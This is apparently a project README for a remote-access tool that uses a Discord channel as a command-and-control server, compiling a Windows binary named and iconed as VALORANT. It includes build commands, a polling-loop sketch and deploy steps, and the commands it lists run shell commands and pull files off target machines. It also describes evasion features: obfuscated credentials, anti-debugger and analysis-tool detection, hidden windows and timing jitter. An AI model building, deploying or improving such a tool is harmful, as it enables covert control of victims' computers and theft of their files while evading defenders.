# opss-terconnect

Discord bot C2. Python, Nuitka-compiled Windows binary. Remote command execution, file download, and host discovery from a Discord control channel.

## How it works

One binary per target machine. Each target runs its own Discord bot (HTTP API client) with its own token. The binary polls the Discord REST API for commands in a control channel; the matching target executes and sends results back via HTTP.

```python
# Polling loop (inside each binary):
while True:
    messages = GET /channels/{channel_id}/messages?limit=10
    for each new message from admin:
        if "!exec <name> <cmd>" and name == my_hostname:
            run cmd locally → POST result back
        elif "!download <name> <path>" and name == my_hostname:
            read file → POST as attachment
        elif "!pingall":
            POST "alive" response
    sleep(5)
```

```bash
# Build per target
python token_gen.py "MT...bot-token..." "channel_id" "admin_id"
# → paste XOR-obfuscated bytes into VALORANT.py

pip install -r requirements.txt
python -m nuitka --onefile --windows-console-mode-disable \
    --windows-icon-from-ico=valorant.ico VALORANT.py
```

No Discord gateway WebSocket connection. No `discord.py` dependency. The binary uses only Python stdlib for HTTP (`urllib`) — significantly smaller than the previous `discord.py`-based build.

## Build

**One build per target. One token per target. Do not share binaries.**

```bash
# 1. Generate XOR-obfuscated config (on build machine, with real token)
python token_gen.py "MT...bot-token..." "channel_id" "admin_id"

# 2. Paste the output into VALORANT.py, replacing the placeholder lists

# 3. Compile with hardening flags
pip install -r requirements.txt
python -m nuitka --onefile --windows-console-mode=disable \
    --windows-icon-from-ico=valorant.ico \
    --lto \
    --python-flag=no_site \
    --python-flag=no_user_site \
    --assume-yes-for-downloads \
    VALORANT.py

# 4. (Optional) Strip the binary to remove debug symbols
#    Linux: strip VALORANT.exe
#    Windows: use editbin /STS or similar post-build step
```

The token, channel ID, and admin ID are XOR-obfuscated in the source — never in plaintext. The compiled binary does not reveal them via `strings` or static analysis.

## Deploy

Copy the `.exe` to the target machine. Run it. The bot connects to Discord, announces itself in the control channel, and waits for commands.

To stop: end the process in Task Manager.

## Commands

| Command | Description |
|---------|-------------|
| `!exec <name> <cmd>` | Run a shell command on the target matching `<name>` (hostname, uppercase) |
| `!download <name> <path>` | Upload a file from the target to the control channel (max 25 MB) |
| `!pingall` | Target responds with a presence check |

## Security

### Built-in

- **XOR-obfuscated credentials** — token, channel ID, admin ID as XOR byte arrays. No plaintext in source or binary. Token is split into multiple arrays and the decode key is derived at runtime from separate constants. Defends against `strings` and static disassembly.
- **Anti-debug** — `IsDebuggerPresent` + `CheckRemoteDebuggerPresent` checked at startup AND before each token decode. Silent exit if attached.
- **Anti-tool scan** — process list checked for ProcmDump, Process Hacker, x64dbg, Cheat Engine, WinDbg, IDA, dnSpy, and others. Silent exit if found.
- **Per-request token decode** — token decoded into a short-lived buffer for each HTTP call, converted to string for the auth header, then wiped. Plaintext token lifetime is bounded to the duration of each HTTP call, not the life of the process.
- **CreateProcess via ctypes** — commands run with `CREATE_NO_WINDOW` flag, no visible console window.
- **Polling jitter** — 4–6 second random sleep between polls instead of fixed 5-second interval, to avoid a machine-identifiable pattern.

### Limitations

- **Memory dump:** The token must be a string in memory for HTTP auth (`Authorization: Bot ***`). A dump taken while a request is in flight finds it. XOR storage defends the binary on disk only.
- **XOR key in repo:** The key constants and obfuscated bytes are committed. A reverse engineer who decodes the logic recovers the values. This stops casual analysis, not a determined debugger.
- **Anti-debug bypassable:** Checks can be circumvented by renaming tools, patching the binary, or dumping externally.
- **Polling latency:** 4–6 second jitter interval vs real-time gateway. Acceptable for C2 command execution, not instant.

## Cleanup

End the executable in Task Manager.

---

## Screenshots

**Connected**

![Connected](images/connected.png)

**Ping**

![Ping](images/ping.png)

**Command execution**

![Exec](images/exec.png)

**File download**

![Download](images/download.png)

**Bonus**

![Pwned](images/pwned.png)

> My friend sent me this after recovering the token from dynamic analysis on the PyArmor build.
